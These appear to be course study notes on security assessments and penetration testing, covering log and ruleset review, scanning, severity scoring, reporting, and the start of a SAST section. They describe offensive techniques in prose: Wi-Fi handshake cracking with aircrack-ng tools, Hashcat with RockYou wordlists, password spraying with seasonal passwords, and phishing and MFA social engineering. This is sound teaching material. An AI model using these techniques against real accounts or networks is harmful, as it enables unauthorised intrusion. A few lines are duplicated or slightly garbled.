			§ Time synchronization across systems is critical.

			§ Retention policies must satisfy:

				□ Compliance needs.

				□ Incident response/forensics requirements.

		○ Log Management vs. SIEM

			§ Log Management System: Collects, stores, and organizes logs.

			§ SIEM (Security Information and Event Management): Adds correlation, analysis, and alerting.

		○ Common Tools

			§ Commercial solutions:

				□ Splunk

				□ Qradar

				□ LogRhythm

				□ AlienVault

			§ Open-source solutions:

				□ Syslog (native Linux logging).

				□ Syslog-ng (enhanced version).

				□ Graylog.

				□ ELK Stack (Elasticsearch, Logstash, Kibana).

		○ Practical Importance

			§ Without consistent log collection and retention, forensic investigations fail.

			§ Example: Healthcare org incident → logs incomplete, inconsistent, or expired.

			§ Result: Inability to reconstruct attack timeline.

		○ Recommended Resource

			§ Critical Log Review Checklist for Security Incidents (Lenny Zeltser \& Anton Chuvakin).

			§ Free resource: zeltser.com/cheat-sheets/.

			§ Provides practical guidance on what log data is most valuable during incidents.



Ruleset Review

	• A ruleset review analyzes the configuration of network security devices (firewalls, routers, IDS/IPS) to ensure rules enforce security best practices, reduce unnecessary complexity, and align with business needs. Proper configuration is essential to prevent misconfigurations that create false security or unnecessary risk.

	• Key Concept

		○ Purpose of Ruleset Review

			§ Assess configurations of routers, firewalls, IDS, IPS.

			§ Rules act as access control settings—they determine what traffic is allowed or denied.

		○ Best Practice – Default Deny

			§ Leading practice: Deny all traffic by default, then explicitly allow based on business needs.

			§ Provides stronger security but requires deeper business understanding and administrative effort.

		○ Example of Misconfiguration

			§ Case: A firewall with a single rule, “Permit IP Any Any”.

			§ Technically met partner compliance, but provided zero security value.

		○ Key Review Considerations

			§ Is Deny All present and properly placed in the ruleset?

				□ Too high in the list blocks all traffic, including business-critical.

			§ Are the rules necessary? (Remove clutter and unused rules).

			§ Do rules follow the principle of least privilege?

				□ Limit access to specific IPs/ports instead of broad permissions.

			§ Ensure specific rules take precedence over general ones.

			§ Close unnecessary ports, especially admin services like SSH and RDP.

			§ Ensure documented requirements exist for all rules.

			§ No backdoors or bypasses should be allowed.

		○ IDS/IPS Rule Review

			§ Disable or remove unnecessary signatures to:

				□ Reduce log storage burden.

				□ Minimize false positives.

			§ Fine-tune required signatures so alerts are actionable.

		○ Tools for Review \& Testing

			§ Use Nmap → to scan for open ports and validate firewall behavior.

			§ Nipper → historically a go-to firewall ruleset auditing tool.

				□ Still effective but no longer free.



System Configuration Review

	• System configuration reviews are essential but resource-intensive security assessment tasks. Automation through scanning tools (like Lynis or CIS-CAT) is critical, and the approach should align with the client’s documented security standards to ensure efficiency and relevance.

	• Key Concepts

		○ Challenge of Manual Reviews

			§ Reviewing configurations across thousands of endpoints manually is nearly impossible.

			§ Automation is essential for scalability and efficiency.

		○ Role of Security Standards

			§ Client’s documented security standards define:

				□ Required/allowed services.

				□ Necessary privileged accounts.

				□ Encryption and security settings.

			§ These should guide what testers look for in a configuration review.

		○ Approach #1: General Scan + Standards Reference

			§ Use tools like Lynis or CIS-CAT.

			§ Identify failures/warnings, then compare against client standards.

			§ Pros: Pinpoints likely high-risk misconfigurations.

			§ Cons: Not a direct one-to-one mapping; may flag items the client already deems unnecessary.

		○ Approach #2: Tailored Technical Policy + Targeted Scan

			§ Build a custom technical policy based on client’s hardening standards.

			§ Use enterprise vulnerability/configuration scanners with authenticated scans.

			§ Pros: More efficient, ensures alignment with client-specific standards.

			§ Cons: Requires access to advanced scanning tech and setup.

		○ Preferred Practices

			§ Start with general tools for broad coverage.

			§ Narrow down findings by validating against client hardening standards.

			§ Use enterprise-grade, policy-driven scans when available for maximum efficiency.



Network Sniffing

	• Network sniffing involves capturing and analyzing network traffic, but its effectiveness depends heavily on timing, placement, and scope. Proper planning ensures meaningful results, such as detecting insecure protocols, unencrypted data, and policy violations.

	• Key Concepts

		○ Time and Duration Matter

			§ The amount of data = directly tied to how long the sniffer runs.

			§ Sniffing at the wrong time skews results:

				□ Before/after office hours → little to no endpoint traffic.

				□ During lunch → personal browsing instead of business activity.

			§ Must align sniffing window with normal business operations.

		○ Placement in the Network

			§ Results depend on which network segment is monitored.

			§ Use client network diagrams to choose the best placement.

			§ Typical placements:

				□ Perimeter → see inbound/outbound traffic.

				□ Behind firewalls → validate filtering rules.

				□ Behind IDS/IPS → confirm alerts/rules fire correctly.

				□ In front of sensitive systems/apps → check principle of least privilege.

				□ On segments requiring encryption → verify compliance.

		○ Data to Look For

			§ Active devices and identifiers (OS, applications).

			§ Services and protocols in use → highlight insecure/prohibited ones (e.g., Telnet).

			§ Unencrypted transmissions, especially sensitive data.

			§ Unencrypted credentials crossing the network.

		○ Preparation Steps

			§ Review network diagrams beforehand.

			§ Discuss with client what “normal” traffic looks like.

			§ Document start/stop times for context in results.



File Integrity Checking

	• File integrity checking (FIC) is a simple concept—comparing a file’s current hash to a trusted hash—but it’s complex to prepare for at scale. It helps detect unauthorized modifications, whether legitimate (patches, upgrades) or malicious (malware tampering). Effective use requires identifying which critical “guarded files” to monitor and implementing appropriate tools.

	• Key Concepts

		○ Core Process

			§ Compare two values: trusted hash vs. current hash.

			§ If the values match → file unchanged.

			§ If they differ → investigate why.

		○ Hashing Functions

			§ Tools use cryptographic hash functions like MD5 or SHA-1 to generate unique digital fingerprints of files.

			§ A hash uniquely identifies a file’s content.

		○ Trusted Hash Baseline

			§ Created when a file is in a known-good state.

			§ Must be updated when legitimate changes (patches, upgrades) occur.

			§ If unexpected changes occur, it may indicate malware tampering.

		○ Challenges of FIC

			§ Easy part: Running checks and comparing values.

			§ Hard part:

				□ Deciding which files to monitor.

				□ Maintaining an accurate, trusted database of hash values.

			§ Guarded Files (examples rarely expected to change)

				□ Windows: explorer.exe → changes may signal compromise.

				□ Linux: /etc/passwd → changes could mean unauthorized account creation.

		○ Enterprise Scale Problem

			§ Thousands of files across many systems makes full coverage impractical.

			§ Best approach: security/system admins define a short, critical list of files.

		○ Tools for File Integrity Monitoring (FIM)

			§ Commercial: Tripwire → popular enterprise solution.

			§ Open-source: OSSEC → host-based intrusion detection with FIM.

			§ Some vulnerability management tools include basic FIM features.

				□ Useful for monitoring a small set of files daily.

				□ Not scalable, but good as a starting point.



#### Identifying Your Targets



Network Discovery

	• Network discovery validates network documentation and firewall rules by identifying live systems and services. It can be done through active scanning (sending probes) or passive scanning (observing traffic), with passive methods being safer for fragile environments like ICS/OT networks.

	• Key Concepts

		○ Purpose of Network Discovery

			§ Documentation and ruleset reviews are useful, but theoretical.

			§ Discovery scanning provides practical, current-state information.

			§ Helps confirm which systems are live and what services they run.

		○ Preparation

			§ Use network diagrams and firewall configs to build a target list.

			§ Configure scanning tools to match the target network segments.

		○ Two Types of Discovery Scanning

			§ Active Scanning

				• Directly interacts with systems by sending packets.

				• Examples:

					® Ping (ICMP) → checks if host is up.

					® OS/service fingerprinting → identifies running systems and services.

				• More thorough but can disrupt fragile systems.

			§ Passive Scanning

				• Does not interact with targets.

				• Captures traffic (e.g., via Wireshark) and extracts source/destination IPs and services.

				• Safer but requires network visibility.

		○ Evolving Tools

			§ Vendors like Tenable and Qualys now offer passive network scanners.

			§ Devices sit on networks, monitor traffic, and identify live hosts automatically.

		○ Special Case: OT/ICS Environments

			§ Industrial Control Systems (ICS) and Operational Technology (OT) often can’t tolerate active scans.

			§ Risks: simple active probes may cause devices to crash or reset to factory defaults.

			§ Passive scanning is strongly recommended in these environments.



Open Source Intelligence

	• OSINT gathering is a passive technique that leverages publicly available information to identify target systems without directly interacting with them. It’s valuable for penetration testers but comes with limitations such as inaccuracy, outdated data, and limited usefulness for internal networks.

	• Key Concepts

		○ Definition of OSINT Gathering

			§ Uses publicly available repositories and information.

			§ Does not directly touch target systems.

			§ Helps identify systems and infrastructure for further assessment.

		○ Limitations

			§ Data may be inaccurate or outdated (false positives if systems were decommissioned).

			§ Generally limited to internet-facing systems, not internal networks.

		○ Exception – DNS Zone Transfers

			§ If improperly configured, a DNS zone transfer can expose internal hostnames and IP addresses.

			§ Best practice: restrict zone transfers to authorized internal hosts only, or disable them entirely.

			§ Performing zone transfers requires explicit client permission.

		○ OSINT Resources

			§ Shodan – Search engine for internet-connected devices.

			§ Censys – Provides internet-wide scan data.

			§ BGP Toolkit – Helps analyze internet routing information.

			§ Hacker Target Zone Transfer Test – Semi-passive tool to test DNS servers.

			§ ZoneTransfer.me (by Digi Ninja) – Safe environment to practice DNS zone transfers.

		○ Rules of Engagement

			§ Always get client approval before attempting semi-passive methods like DNS queries.

			§ In some cases, clients may provide direct DNS exports instead.

		○ Unexpected Discoveries

			§ Network discovery (via OSINT or scanning) may uncover unauthorized devices.

			§ Best practice: stop and notify the client immediately.

				□ Could be a policy violation (employee device).

				□ Or worse, an attacker-planted device for persistence.



Network Port and Service Identification

	• After discovering live hosts, the next step in network assessment is identifying open ports and running services. This provides deeper insight into potential security risks, especially insecure protocols and exposed administration services. Tools like Nmap make this process efficient but require careful configuration for thorough and accurate results.

	• Key Concepts

		○ Importance of Port \& Service Discovery

			§ Finding hosts is just the start; knowing which ports are open and which services are running is critical for security assessment.

			§ Reveals potential attack vectors for exploitation.

		○ Dealing with Blocked Ping

			§ Some hosts/networks block ICMP ping requests.

			§ Nmap has a flag to assume hosts are alive, improving detection accuracy at the cost of longer scans.

		○ Key Targets to Identify

			§ Unencrypted protocols → high risk:

				□ Telnet.

				□ FTP.

				□ HTTP (credentials often visible in captures).

			§ Remote administration tools → sensitive:

				□ SSH, RDP, VNC, HTTPS.

			§ Nmap Options for Service Identification

				□ -A (aggressive scan) → detects service/version information.

				□ Default scan → top 1,000 most common TCP ports.

				□ -p flag → specify ports/ranges:

					® Example: -p 80 for HTTP.

					® -p 1-65535 → scans all 65k+ TCP ports (and UDP, if specified).

				□ -p 1-65535 → scans all 65k+ TCP ports (and UDP, if specified).

			§ Trade-off: broader scans = more time and network traffic, but yield comprehensive results.

		○ Scanning Strategy for DMZs

			§ Perform scans from both external and internal vantage points:

				□ External scan → shows what outsiders can access.

				□ Internal scan → shows what an attacker could exploit if they gain a foothold inside.



Vulnerability Scanning

	• After host and service discovery, the next step is vulnerability scanning—identifying weaknesses that attackers could exploit. Vulnerability scans provide descriptions, severity scores, and remediation guidance, but they carry risks, especially with older or fragile systems. The choice between authenticated and unauthenticated scans is critical for balancing depth of results and potential impact.

	• Key Concepts

		○ Purpose of Vulnerability Scanning

			§ Detect weaknesses that could be:

				□ Exploited intentionally by attackers.

				□ Exploited intentionally by attackers.

			§ Scanners provide:

				□ Vulnerability description.

				□ Severity score.

				□ Remediation guidance.

			§ Risks of Vulnerability Scans

				□ Scans can disrupt fragile or outdated systems (e.g., old switch rebooting mid-scan).

				□ Even authorized scans can cause unintended outages.

				□ However, findings can justify upgrades and strengthen security.

			§ Authenticated vs. Unauthenticated Scans

				□ Authenticated scans:

					® Provide deeper, more complete results.

					® Higher risk of negative impact.

				□ Unauthenticated scans:

					® Simulate an outsider’s view.

					® Safer for fragile systems but less detailed.

				□ Recommended Best Practices

					® Internal hosts: Perform authenticated scans.

					® External hosts: Perform unauthenticated scans.

					® Web applications:

						◊ Non-production → authenticated scans.

						◊ Production → unauthenticated scans.

					® Mobile applications: Perform offline scans on production instances.



Determining Severity

	• Vulnerability severity is determined by evaluating both the likelihood of exploitation and the impact if exploited. Industry standards such as CVSS, CWE, and EPSS provide structured, repeatable ways to assess and prioritize vulnerabilities for remediation.

	• Key Concepts

		○ Severity Factors

			§ Likelihood of exploitation → how easy is it for an attacker?

			§ Impact of exploitation → what happens if successful (confidentiality, integrity, availability)?Examples

		○ Examples

			§ Low severity: external system leaks internal hostnames.

			§ High severity: internet-facing system with command injection allowing full admin control.

		○ Common Vulnerability Scoring System (CVSS)

			§ Open industry standard for scoring OS vulnerabilities.

			§ Uses base metrics:

				□ Access vector (how it’s exploited).

				□ Attack complexity (easy vs. difficult).

				□ Authentication (does attacker need credentials?).

			§ Uses impact metrics: CIA triad (confidentiality, integrity, availability).

			§ Produces a repeatable severity score.

		○ Common Weakness Enumeration (CWE)

			§ Catalog of software/hardware weaknesses that can lead to vulnerabilities.

			§ Includes:

				□ Likelihood of exploit.

					® Memberships/relationships (e.g., CWE-242 → dangerous functions → linked to prohibited code).

				□ Helps testers map and connect related vulnerabilities.

		○ Exploit Prediction Scoring System (EPSS)

			§ Predicts likelihood of exploitation in the wild.

			§ Uses data and statistics.

			§ Provides a percentage score → closer to 100% = higher urgency.

			§ Complements CVSS and CWE.

		○ Vulnerability Disclosure Lifecycle

			§ Ethical researchers first privately disclose findings to vendors.

			§ Vendors patch before public release.

			§ Once public, scanning vendors develop detection signatures.

			§ Security testers then use updated tools to detect those vulnerabilities.



Wireless Nessus

	• Wireless scanning is a critical step in securing enterprise environments that rely heavily on Wi-Fi. It involves understanding the scope, environment, and security settings of wireless networks, identifying weak configurations, and ensuring that organizations adopt strong, modern standards like WPA2/WPA3 Enterprise.

	• Key Concepts

		○ Evolution of Wireless in Enterprise

			§ Early 2000s → wireless adoption grew slowly.

			§ 2007 iPhone launch → accelerated the mobile enterprise experience.

			§ Now common to see multiple networks:

				□ Managed devices.

				□ Personal/BYOD devices.

				□ IoT devices.

		○ Pre-Assessment Questions

			§ Which locations should have wireless enabled?

			§ Any environmental interference? (e.g., window films, nearby networks).

			§ What security settings should apply (policy review)?

			§ What does a normal usage day look like (ensure endpoints are active during scans)?

			§ Are there security technologies that could interfere with scans?

		○ Wireless Scanning Setup

			§ Use a second wireless antenna → separates scanning traffic from normal traffic.

			§ Ensures cleaner, dedicated wireless data collection.

		○ Wireless Security Configurations (least → most secure)

			§ Open/unencrypted → no protection.

			§ WEP → insecure, easily broken.

			§ WPA → also broken.

			§ WPA2 (personal) → stronger, but only requires a password.

			§ WPA2 Enterprise → strong encryption + certificate-based authentication.

			§ WPA3 Enterprise → most secure option.

		○ Penetration Testing Considerations

			§ Any configuration weaker than WPA2 = significant risk.

			§ Tools to break WEP/WPA have been effective for years.

			§ WPA2/WPA3 Enterprise is recommended:

				□ Requires both password + certificate, preventing simple credential-based access.



Wireless Testing Process

	• The wireless testing process uses both passive and active scanning techniques to identify wireless networks, capture authentication handshakes, and potentially crack encryption keys to test the strength of wireless security.

	• Key Concepts

		○ Passive Wireless Scanning

			§ Tools monitor the airwaves for wireless traffic.

			§ Works with both access point broadcasts and connected client traffic.

			§ Tools:

				□ Wireshark → captures wireless packets similar to wired captures.

				□ Airmon-ng → creates a virtual wireless adapter and lists networks, encryption settings, channels, MAC addresses of APs and clients.

				□ Airodump-ng → collects authentication handshakes between clients and access points.

		○ Active Wireless Scanning

			§ Goes beyond monitoring; involves interacting with targets.

			§ Example: Aireplay-ng → forces a client to disconnect, then intercepts the handshake during reconnection.

			§ More intrusive but more effective for penetration testing.

		○ Penetration Testing on WPA2 Personal Networks

			§ Common workflow:

				□ Capture handshake with Airodump-ng + Aireplay-ng.

				□ Use Aircrack-ng to brute force the captured encrypted handshake offline.

				□ If successful → recover plaintext Wi-Fi password.

				□ Attacker/tester can then authenticate to the network.

		○ Testing Goal

			§ Demonstrates whether weak or guessable Wi-Fi credentials can be exploited.

			§ Highlights risks of relying only on WPA2 Personal passwords.



#### Vulnerability Validation



Password Cracking

	• Password cracking is a vital penetration testing technique for validating vulnerabilities. Since most breaches involve weak or compromised credentials, testers must understand how passwords are stored, how attackers crack them, and how to demonstrate the real risk of weak authentication.

	• Key Concepts

		○ Why Password Cracking Matters

			§ Vulnerability validation → proving weaknesses are real and exploitable.

			§ F5 breach analysis: 87% of breaches were tied to app security or identity/access management flaws.

			§ Verizon DBIR confirms this trend continues → attackers still focus on weak passwords and technical vulnerabilities.

			§ Pentesters repeatedly succeed by exploiting weak credentials to impersonate users.

		○ How Passwords Are Stored

			§ Applications often store hashed passwords, not plaintext.

			§ Hashing = one-way function producing a unique output.

			§ Login works by hashing user input and comparing it to the stored hash.

			§ Cracking = finding the plaintext password that matches a stored hash.

		○ Password Cracking Techniques

			§ Use wordlists to test possible passwords against hashes.

			§ Wordlist quality directly impacts cracking success.

			§ Cracking overlaps art + science: choosing likely candidates is key.

		○ RockYou Wordlists

			§ 2009 RockYou breach leaked 32M real-world passwords.

			§ Became a go-to wordlist for penetration testers.

			§ Expanded into RockYou2021 and RockYou2024, now with billions of entries.

			§ Included in Kali Linux by default (/usr/share/wordlists).

		○ Tools for Password Cracking

			§ Hashcat → fast, supports many hash types.

			§ Uses RockYou and similar wordlists effectively.

			§ Other resources: Hash Crack: Password Cracking Manual.



Penetration Test Planning

	• Effective penetration test planning requires clearly defining the scope, goals, and methodology, ensuring proper authorization, and aligning test activities with the client’s expectations. Pen tests often focus on privilege escalation and lateral movement but may target specific data or systems depending on compliance or business needs.

	• Key Concepts

		○ Core Pen Test Activities

			§ Privilege escalation → compromise a system and gain admin-level access.

			§ Lateral movement → expand from one compromised system/application to others, extracting sensitive data.

			§ Alternative goals (e.g., PCI DSS) may focus on compromising cardholder data without needing admin credentials.

		○ Importance of Client Goals

			§ Understanding why the client requested the test is critical.

			§ Goals may vary: sensitive data exposure, regulatory compliance, or resilience testing.

		○ Methodologies

			§ NIST Four-Stage Approach:

				□ Planning.

				□ Discovery.

				□ Attack → includes gaining access, escalating privileges, system browsing, tool installation.

				□ Reporting.

			§ Penetration Testing Execution Standard (PTES):

				□ Pre-engagement interactions.

				□ Intelligence gathering.

				□ Threat modeling.

				□ Vulnerability analysis.

				□ Exploitation.

				□ Post-exploitation.

				□ Reporting.

			§ Best practice: combine and adapt methodologies instead of strictly following one.

		○ Planning Essentials

			§ Define scope, methodology, and goals upfront.

			§ Obtain written authorization from the client to test in-scope systems/applications.

		○ Possible Areas of Focus

			§ Internet-facing systems and applications.

			§ Mobile applications.

			§ Internal systems and applications.

			§ Physical office locations.

			§ Company employees (social engineering).

			§ Third-party hosted systems and applications.



Penetration Test Tools

	• Penetration test tools support reconnaissance, OSINT gathering, vulnerability analysis, and credential discovery. Tools range from automated scripts like Discover to specialized OSINT, metadata, and vulnerability scanners. Testers must balance automation with stealth, since noisy tools can trigger detection systems.

	• Key Concepts

		○ Reconnaissance vs. Scope

			§ After scope is defined, testers should do their own reconnaissance.

			§ Compare findings with client’s scope → sometimes uncover overlooked systems/apps still online.

		○ OSINT \& Discover Tool

			§ Discover (by Lee Baird) automates OSINT gathering.

			§ Built on Recon-ng and The Harvester.

			§ Requires API keys for best results:

				□ Bing, Google, Google CSE.

				□ BuiltWith (tech profiling).

				□ FullContact (person/company data).

				□ GitHub (code repos).

				□ Hunter.io (email addresses).

				□ SecurityTrails (DNS, IP).

				□ Shodan (domains, hosts, open ports).

			§ Produces rich, automated OSINT quickly.

		○ Vulnerability Analysis Approaches

			§ Automated Scanners (e.g., Nessus, Qualys):

				□ Detailed \& accurate results.

				□ Risk: noisy, may trigger SIEM alerts or IPS blocks.

			§ OSINT + Credentials Approach:

				□ Stealthier → avoids tripping alarms.

				□ Relies on gathering emails/usernames and exploiting login weaknesses.

		○ Credential Discovery Techniques

			§ OSINT often reveals emails + usernames.

			§ Patterns: firstname.lastname, f.lastname, firstname\_lastname.

			§ Tools:

				□ Hunter.io → identifies email naming conventions.

				□ Discover (with APIs) → automates collection.

				□ Manual Hunter searches → same info without automation.

				□ FOCA and Metagoofil → extract usernames from document metadata (Word, PDF, Excel).

			§ Once naming convention is known, LinkedIn can be mined for employee names → generate valid usernames.



Penetration Test Techniques

	• One of the most effective penetration testing techniques is password spraying, which exploits common user behaviors and weak password practices. Pen testers must keep up with evolving offensive and defensive techniques, using resources like the Red Team Field Manual (RTFM) and Blue Team Field Manual (BTFM) to stay sharp.

	• Key Concepts

		○ Password Spraying Technique

			§ Definition: Instead of testing many passwords against one username, test one password across many usernames.

			§ Advantage: Avoids account lockouts (since most systems don’t lock out users after a single failed attempt).

			§ Attack model: Just one weak but commonly used password can compromise accounts.

		○ Common Password Patterns Exploited

			§ Example: Season + Year + Special Character (e.g., Summer2025!).

			§ These meet typical password complexity requirements:

				□ Uppercase + lowercase.

				□ Alphanumeric.

				□ Minimum length.

				□ Special character.

			§ They also align with 90-day rotation policies (seasonal changes).

		○ Policy Context

			§ Many organizations still require 90-day password changes, despite NIST guidance advising against forced periodic changes.

			§ This outdated practice encourages predictable password patterns.

		○ Evolution of Techniques

			§ Penetration testing methods are constantly evolving.

			§ Successful testers stay updated on both attacker tools and defensive strategies.

		○ Recommended Resources

			§ Red Team Field Manual (RTFM) → offensive tactics, commands, scripts.

			§ Blue Team Field Manual (BTFM) → defensive strategies, incident response, log analysis.

			§ Both provide practical, field-ready references.



Social Engineering

	• Social engineering exploits human behavior rather than technology, making it one of the most effective attack methods. For penetration testers, it’s essential to include social engineering in engagements to evaluate user awareness, identify weaknesses, and provide actionable improvements for organizational resilience.

	• Key Concepts

		○ Nature of Social Engineering

			§ Focuses on tricking people into taking harmful actions.

			§ Easier than hacking technical systems in many cases.

			§ Should always be included in penetration tests.

		○ Common Attack Methods

			§ Phishing → malicious emails with attachments or links installing malware.

			§ Credential harvesting →

				□ Impersonating trusted staff (e.g., help desk calls).

				□ Fake login pages mimicking legitimate sites.

			§ Password reset abuse → exploiting weak secret questions (OSINT-driven).

		○ Tools

			§ Social Engineer Toolkit (SET):

				□ Open-source Python tool by Dave Kennedy.

				□ Pre-installed in Kali Linux.

				□ Contains multiple attack vectors against websites, wireless networks, email, mobile, and hardware.

				□ Automates phishing, credential harvesting, and other social engineering attacks.

		○ Beyond Phishing

			§ Physical site visits → test office security by bypassing reception, planting rogue devices, or leaving malicious USB drives.

			§ MFA social engineering → tricking users into providing valid MFA codes under the guise of IT support.

			§ Password self-service portals → exploiting weak or easily guessed answers to reset credentials without direct contact.

		○ Ethical Purpose

			§ Goal isn’t to embarrass employees.

			§ Purpose is to evaluate awareness, identify weak spots, and provide targeted guidance to strengthen defenses.



#### Additional Considerations



Coordinating Your Assessments

	• Coordinating security assessments requires careful planning around stakeholders, scheduling, access, authorization, incident response, and communication. Proper coordination minimizes risks, prevents unnecessary disruptions, and ensures sensitive findings are handled securely.

	• Key Concepts

		○ Stakeholder Identification

			§ Goes beyond the cybersecurity team.

			§ Includes network, system, and application administrators, as well as help desk teams.

			§ Engaging managers early prevents confusion if suspicious activity is detected.

		○ Scheduling Considerations

			§ Choose times that minimize operational impact.

			§ Avoid blackout periods such as:

				□ Retail holidays.

				□ Large IT project cutovers.

			§ Running assessments during these times adds unnecessary business risk.

		○ Access and Authorization

			§ Ensure testers have required credentials for authenticated scans or insider simulations.

			§ For physical social engineering tests, testers must carry written authorization letters from the client.

			§ Real-world risk: testers could be mistaken for intruders (even arrested) without proper documentation.

		○ Incident Response Planning

			§ Document an engagement incident response plan before starting.

			§ Address scenarios such as:

				□ Discovering an active compromise during testing.

				□ Accidentally disrupting production services.

			§ Plan should define escalation paths and communication protocols.

		○ Communication Plan

			§ Define how updates will be shared with clients:

				□ Weekly emails.

				□ Daily or twice-daily updates.

				□ Real-time channels like Slack.

			§ Ensure secure communication methods (avoid unencrypted email for sensitive data).

			§ Align expectations with the client before the assessment begins.

		○ Pre-Engagement Meeting

			§ Best way to clarify scope, access, communication, and expectations.

			§ Ensures both client and testers are aligned and avoids misunderstandings.

			



Data Analysis

	• Data analysis during a security assessment should happen continuously, not just at the end. Effective analysis requires balancing curiosity and technical exploration with time management and client-focused reporting.

	• Key Concepts

		○ Ongoing Analysis

			§ Don’t wait until the end → analyze findings as you go.

			§ Helps maintain focus and ensures key findings aren’t overlooked.

		○ Challenge of Focus

			§ Pen testing is exciting (legal hacking, puzzles, exploration).

			§ Curiosity can cause testers to lose track of time and drift from engagement goals.

			§ Tight timeframes make time management essential.

		○ Discipline Through Practice

			§ Build analysis and reporting discipline with structured exercises:

				□ Run a Nessus vulnerability scan on a lab VM.

				□ Set a 60-minute timer to analyze results and draft a summary report.

				□ Hard stop after 60 minutes → focus on identifying critical findings and articulating why they matter.

			§ Repeating the exercise improves both analysis skills and time management.

		○ From Findings to Storytelling

			§ Clients don’t just want to know there are vulnerabilities.

			§ They want context:

				□ Why the issue matters.

				□ How it could impact business operations, security, or reputation.

			§ Reporting should translate technical results into business risk.



Providing Context

	• Even lower-severity vulnerabilities can be dangerous when chained together. Security testers must provide context in their analysis, connecting related findings into realistic attack paths that automated scans alone won’t reveal.

	• Key Concepts

		○ Don’t Ignore Low-Severity Issues

			§ Lower-severity vulnerabilities may seem minor in isolation.

			§ Attackers (and skilled pen testers) can chain them together to achieve serious compromise.

		○ Real-World Example (D-Link Routers, 2018)

			§ Vulnerabilities chained:

				□ Directory traversal (CVE-2018-10822).

				□ Admin password stored in plaintext (CVE-2018-10824).

				□ Arbitrary code execution (CVE-2018-10823).

			§ Attack sequence:

				□ Use directory traversal to browse sensitive files.

				□ Extract plaintext admin password.

				□ Log in and exploit remote code execution as an authenticated user.

			§ Result → full compromise of affected devices.

		○ Scanner vs. Pen Tester

			§ Vulnerability scans flag issues individually, without linking them.

			§ Penetration tests add value by analyzing and demonstrating how issues can be combined into a real-world exploit chain.

		○ Contextual Analysis Is Critical

			§ Testers must go beyond surface-level reporting.

			§ Providing context helps organizations see the true business risk of vulnerabilities.



Data Handling

	• Security assessments generate highly sensitive data that, if mishandled, could aid attackers. Therefore, data handling must be as carefully planned as the testing itself, covering collection, storage, transmission, and destruction.

	• Key Concepts

		○ Sensitivity of Assessment Data

			§ Data collected includes:

				□ Vulnerability scan artifacts.

				□ Notes, spreadsheets, mind maps.

				□ Communications (emails, Slack, voicemails).

				□ The final report (a step-by-step attack guide if leaked).

			§ Mishandling this data could cause severe damage to the client.

		○ Four Key Areas of Data Handling

			§ Collection

				□ Only collect what’s needed → avoid unnecessary liability.

			§ Storage

				□ Enforce strong encryption for data at rest.

				□ Use tools like BitLocker (Windows), FileVault (Mac), or VeraCrypt for encrypted volumes.

			§ Transmission

				□ Never send data over unencrypted channels.

				□ Use encrypted email or secure file-sharing services (Box, SharePoint, Google Drive).

				□ Apply principle of least privilege for access.

			§ Low-Tech Safeguards

				□ Add cover pages and confidential markings on reports.

				□ Helps prevent accidental mishandling.



Drafting Your Report

	• A security assessment report must be carefully drafted, QA’d, and tailored to different audiences (executives, management, and staff). Each audience has unique needs, and addressing them ensures the report is actionable and well-received.

	• Key Concepts

		○ Don’t Deliver the First Draft

			§ Avoid sending a single unreviewed draft.

			§ Seek client feedback during the process.

			§ Have a QA reviewer (someone other than yourself) check the report.

		○ Three Key Audiences \& Their Needs

			§ Executives (high-level view):

				□ Want the big picture, not technical details.

				□ Use the executive summary (short, business-centric language).

				□ Their focus: budget, staffing, and strategic decisions.

			§ Management (resource allocation):

				□ Need a punch-down list of priorities.

				□ Responsible for reallocating staff, hiring, purchasing licenses, updating security documentation, and coordinating communication.

				□ Their focus: logistics, timelines, and resourcing.

			§ Staff (technical detail):

				□ Network admins, sysadmins, developers.

				□ Need specific remediation steps and technical details to implement fixes.

				□ Their focus: execution and hands-on remediation.

			§ Tailoring the Report

				□ One report → three perspectives.

				□ Ensure the draft speaks to all audiences before delivery.



Delivering Your Report

	• Delivering a security assessment report should be a staged, client-focused process that ensures alignment with expectations, engages stakeholders, and provides both findings and context to maximize impact.

	• Key Concepts

		○ Map Report to Statement of Work (SOW)

			§ Every item in the report should trace back to the client’s original request.

			§ Ensures the final deliverable aligns with expectations and scope.

		○ Deliver in Stages

			§ Stage 1 – Draft Review Meeting

				□ Share a polished draft (well-formatted, free of spelling errors).

				□ Primary goal: give client contact a chance to respond, correct, or refine.

				□ Include client-specific details (culture, challenges) to increase relevance.

			§ Stage 2 – Final Delivery Meeting

				□ Include key stakeholders since they will be most impacted.

				□ Be prepared for tension (e.g., internal power struggles) that could shape how findings are received.

		○ Provide Context Alongside Findings

			§ Don’t just deliver vulnerabilities and technical issues.

			§ Explain why findings matter, how they impact the organization, and how fixes will benefit the business, employees, and customers.

			§ “Context is everything.”

		○ Follow Secure Data Handling Procedures

			§ Use your established data handling plan (secure storage, transmission, access).

			§ Only then mark the assessment as complete.

#### Additional Resources



📚 Recommended Books

	• RTFM: The Red Team Field Manual

	• BTFM: The Blue Team Field Manual

	• Hash Crack: The Password Cracking Manual

	• Penetration Testing: A Hands-On Introduction to Hacking



📑 Key NIST Publications

	• SP 800-30 Rev 1 – Guide for Conducting Risk Assessments

	• SP 800-53 Rev 5 – Security and Privacy Controls for Federal Information Systems and Organizations

	• NIST Cybersecurity Framework (CSF)

	• (Previously referenced: SP 800-115 – Technical Guide to Information Security Testing and Assessment)



👥 Professional Organizations

	• ISSA – issa.org

Great for security generalists.

	• ISACA – isaca.org

Focused on IT auditors and cross-functional discussions.

	• ISC² – isc2.org

Certification body for CISSP, CSSLP, etc.

	• InfraGard – infragard.org

Public-private sector collaboration in the U.S.

	• OWASP – owasp.org

Focus on application and web security.



🎤 Conferences \& Events

	• InfoSec Conferences – infosec-conferences.com

	• BSides Security Conferences – securitybsides.com

Affordable, community-run conferences.

	• YouTube Security Talks – irongeek.com (Adrian Crenshaw’s recordings)



📡 Stay Connected

	• LinkedIn Learning Courses – by Jerod

	• Simplifying Cybersecurity (LinkedIn page for ongoing updates)





---------------------------------------------------------------------------------------------------------------------------------------------------------------------------



### Static Application Security Testing (SAST)

#### Leading Practices



Security in the SDLC

	• Security must be integrated into the Software Development Life Cycle (SDLC) in a way that aligns with developers’ priorities and workflows. This is best achieved by breaking security into manageable touchpoints, starting with static testing, and balancing technical, organizational, and market considerations.

	• Key Concepts

		○ SDLC Overview

			§ Three stages: Conceptualize → Develop → Release.

			§ From a developer’s perspective, security often feels like an afterthought or burden unless properly integrated.

		○ Developer Perspective

			§ Developers face competing priorities, deadlines, and unclear requirements.

			§ Adding “make it secure” without guidance increases stress.

			§ Security professionals should “seek first to understand” developers’ challenges.

		○ Four Security Touchpoints in the SDLC

			§ Documentation review: Ensure contracts and third-party work include security requirements.

